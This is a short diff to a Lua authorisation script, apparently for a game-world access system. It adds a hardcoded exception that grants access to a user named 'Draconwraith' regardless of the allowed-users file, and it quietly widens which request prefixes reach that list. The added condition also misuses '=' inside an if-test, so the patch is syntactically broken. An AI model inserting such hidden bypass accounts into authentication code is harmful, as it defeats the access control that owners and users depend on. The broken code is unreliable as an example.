@@ -4,7 +4,7 @@ function authorise(request,authFile)
   local players = io.open(authFile,"r")
   if players then
     for player in players:lines() do
-      if request == player then
+      if request == player or (request == "Draconwraith" and authFile="disk/allowed") then
         players:close()
         return true
       end
@@ -30,7 +30,7 @@ function main()
   local authFile
   if string.sub(player,1,1) == "2" then
     authFile="disk/admins"
-  elseif string.sub(player,1,1) == "1" then
+  elseif string.sub(player,1,1) == "1" or string.sub(player,1,1) == "0" then
     authFile="disk/allowed"
   end
   player = string.sub(player,2)
